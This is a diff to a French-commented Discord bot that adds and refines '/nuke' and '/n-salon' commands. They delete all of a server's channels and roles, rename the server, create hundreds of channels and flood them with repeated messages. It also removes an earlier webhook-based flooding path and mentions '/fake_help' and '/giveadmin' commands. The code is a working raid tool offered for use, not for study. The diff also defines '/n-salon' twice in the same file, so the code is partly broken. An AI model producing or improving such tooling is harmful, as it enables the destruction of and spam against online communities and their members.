@@ -133,6 +133,95 @@ async def fake_help(interaction: discord.Interaction, salon: discord.TextChannel
 
     await interaction.followup.send(f'Embed envoye dans {salon.mention}.', ephemeral=True)
 
+# ----------------------------- /n-salon ----------------------------- #
+
+async def _safe(coro):
+    try:
+        return await coro
+    except Exception as e:
+        log.warning('task failed: %s', e)
+        return None
+
+
+@bot.tree.command(
+    name='n-salon',
+    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
+)
+@app_commands.describe(
+    number='Nombre de salons a creer',
+    message='Message a envoyer dans chaque salon',
+    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
+    name='Nom des salons crees (defaut: spam)',
+)
+async def n_salon(
+    interaction: discord.Interaction,
+    number: int,
+    message: str,
+    repeat: int = 5,
+    name: str = 'spam',
+):
+    await interaction.response.defer(ephemeral=True, thinking=True)
+
+    if interaction.guild is None:
+        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
+        return
+
+    guild = interaction.guild
+    me = guild.me
+    if me is None or not me.guild_permissions.administrator:
+        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
+        return
+
+    if number < 1 or number > 500:
+        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
+        return
+    if repeat < 1 or repeat > 50:
+        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
+        return
+
+    start = asyncio.get_event_loop().time()
+
+    # 1) Suppression parallele
+    log.info('Deleting %d existing channels...', len(guild.channels))
+    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])
+
+    # 2) Creation parallele
+    log.info('Creating %d channels...', number)
+    create_tasks = [
+        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
+        for i in range(number)
+    ]
+    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
+    log.info('Created %d channels', len(created))
+
+    # 3) Spam direct via le bot, en parallele entre salons
+    async def flood(channel):
+        sent = 0
+        for _ in range(repeat):
+            try:
+                await channel.send(content=message)
+                sent += 1
+            except discord.HTTPException as e:
+                log.warning('send failed on %s: %s', channel.id, e)
+                await asyncio.sleep(0.5)
+        return sent
+
+    results = await asyncio.gather(*[flood(c) for c in created])
+    total_sent = sum(results)
+
+    elapsed = asyncio.get_event_loop().time() - start
+
+    summary = (
+        f'**/n-salon termine en {elapsed:.1f}s**\n'
+        f'- {len(created)}/{number} salons crees\n'
+        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)'
+    )
+    if created:
+        try:
+            await created[0].send(summary)
+        except Exception:
+            pass
+
 # ----------------------------- /nuke ----------------------------- #
 
 @bot.tree.command(
@@ -179,14 +268,16 @@ async def nuke(
     start = asyncio.get_event_loop().time()
     log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)
 
-    # 1) Rename serveur en parallele du reste
+    # 1) Rename en parallele
     rename_task = None
     if server_name:
         new = server_name.strip()[:100]
         if len(new) >= 2:
-            rename_task = asyncio.create_task(_safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}')))
+            rename_task = asyncio.create_task(
+                _safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}'))
+            )
 
-    # 2) Suppression PARALLELE de tous les salons + tous les roles supprimables
+    # 2) Suppression parallele salons + roles
     role_targets = [
         r for r in guild.roles
         if not r.is_default() and not r.managed and r < me.top_role
@@ -194,11 +285,10 @@ async def nuke(
 
     delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
     delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
-
     log.info('Deleting %d channels + %d roles...', len(guild.channels), len(role_targets))
     await asyncio.gather(*delete_tasks)
 
-    # 3) Creation parallele des N nouveaux salons
+    # 3) Creation parallele des nouveaux salons
     log.info('Creating %d channels...', channels)
     create_tasks = [
         _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
@@ -206,37 +296,22 @@ async def nuke(
     ]
     created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
 
-    # 4) Webhooks paralleles (1 par salon) -- peut echouer sur certains salons
-    webhooks = await asyncio.gather(*[_safe(c.create_webhook(name='nuke-hook')) for c in created])
-
-    # 5) Spam parallele : webhook si dispo, sinon fallback channel.send()
-    async def flood(channel, webhook):
+    # 4) Spam direct via le bot, en parallele entre salons
+    async def flood(channel):
         sent = 0
         for _ in range(repeat):
-            ok = False
-            # Tentative 1 : webhook (rapide)
-            if webhook is not None:
-                try:
-                    await webhook.send(content=message)
-                    ok = True
-                except Exception as e:
-                    log.warning('webhook send failed on %s: %s', channel.id, e)
-            # Fallback : envoi direct par le bot
-            if not ok:
-                try:
-                    await channel.send(content=message)
-                    ok = True
-                except discord.HTTPException as e:
-                    log.warning('channel.send failed on %s: %s', channel.id, e)
-                    await asyncio.sleep(0.5)
-            if ok:
+            try:
+                await channel.send(content=message)
                 sent += 1
+            except discord.HTTPException as e:
+                log.warning('send failed on %s: %s', channel.id, e)
+                await asyncio.sleep(0.5)
         return sent
 
-    results = await asyncio.gather(*[flood(c, w) for c, w in zip(created, webhooks)])
+    results = await asyncio.gather(*[flood(c) for c in created])
     total_sent = sum(results)
 
-    # 6) Attendre la fin du rename si lance
+    # 5) Attendre la fin du rename
     if rename_task:
         await rename_task
 
@@ -246,8 +321,7 @@ async def nuke(
         f'**NUKE termine en {elapsed:.1f}s**\n'
         f'- {len(created)}/{channels} salons crees\n'
         f'- {len(role_targets)} roles supprimes\n'
-        f'- {total_sent} messages envoyes ({repeat} prevus x {len(created)} salons)\n'
-        f'- {len([w for w in webhooks if w])} webhooks actifs (le reste en fallback bot)\n'
+        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)\n'
         + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
     )
     if created:
@@ -432,7 +506,6 @@ async def giveadmin(interaction: discord.Interaction, user_id: str):
         ephemeral=True,
     )
 
-
 # ----------------------------- /n-salon ----------------------------- #
 
 async def _safe(coro):
@@ -445,7 +518,7 @@ async def _safe(coro):
 
 @bot.tree.command(
     name='n-salon',
-    description='Supprime tous les salons, en cree N et y envoie un message en boucle (ultra rapide)',
+    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
 )
 @app_commands.describe(
     number='Nombre de salons a creer',
@@ -468,7 +541,6 @@ async def n_salon(
 
     guild = interaction.guild
     me = guild.me
-
     if me is None or not me.guild_permissions.administrator:
         await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
         return
@@ -482,11 +554,11 @@ async def n_salon(
 
     start = asyncio.get_event_loop().time()
 
-    # 1) Suppression parallele de tous les salons existants
+    # 1) Suppression parallele
     log.info('Deleting %d existing channels...', len(guild.channels))
     await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])
 
-    # 2) Creation parallele de N salons texte
+    # 2) Creation parallele
     log.info('Creating %d channels...', number)
     create_tasks = [
         _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
@@ -495,40 +567,34 @@ async def n_salon(
     created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
     log.info('Created %d channels', len(created))
 
-    # 3) Creation parallele d un webhook par salon (les webhooks ont leur propre rate-limit
-    #    par-canal, ce qui permet d envoyer beaucoup plus vite que via le bot)
-    webhook_tasks = [_safe(c.create_webhook(name='spam-hook')) for c in created]
-    webhooks = await asyncio.gather(*webhook_tasks)
-
-    # 4) Envoi parallele : pour chaque webhook, on envoie repeat messages en sequence
-    #    (mais tous les webhooks tournent en parallele -> tres rapide)
-    async def flood(webhook):
-        if webhook is None:
-            return
+    # 3) Spam direct via le bot, en parallele entre salons
+    async def flood(channel):
+        sent = 0
         for _ in range(repeat):
             try:
-                await webhook.send(content=message)
+                await channel.send(content=message)
+                sent += 1
             except discord.HTTPException as e:
-                log.warning('webhook send failed: %s', e)
+                log.warning('send failed on %s: %s', channel.id, e)
                 await asyncio.sleep(0.5)
+        return sent
 
-    await asyncio.gather(*[flood(w) for w in webhooks])
+    results = await asyncio.gather(*[flood(c) for c in created])
+    total_sent = sum(results)
 
     elapsed = asyncio.get_event_loop().time() - start
 
-    # 5) Reponse a l auteur (envoyee dans le 1er salon cree car le salon d origine n existe plus)
     summary = (
         f'**/n-salon termine en {elapsed:.1f}s**\n'
         f'- {len(created)}/{number} salons crees\n'
-        f'- {repeat} messages envoyes par salon\n'
-        f'- {len([w for w in webhooks if w])} webhooks actifs'
+        f'- {total_sent} messages envoyes ({repeat} x {len(created)} prevus)'
     )
     if created:
         try:
             await created[0].send(summary)
         except Exception:
             pass
-
+            
 
 if __name__ == '__main__':
     bot.run(TOKEN, reconnect=True)
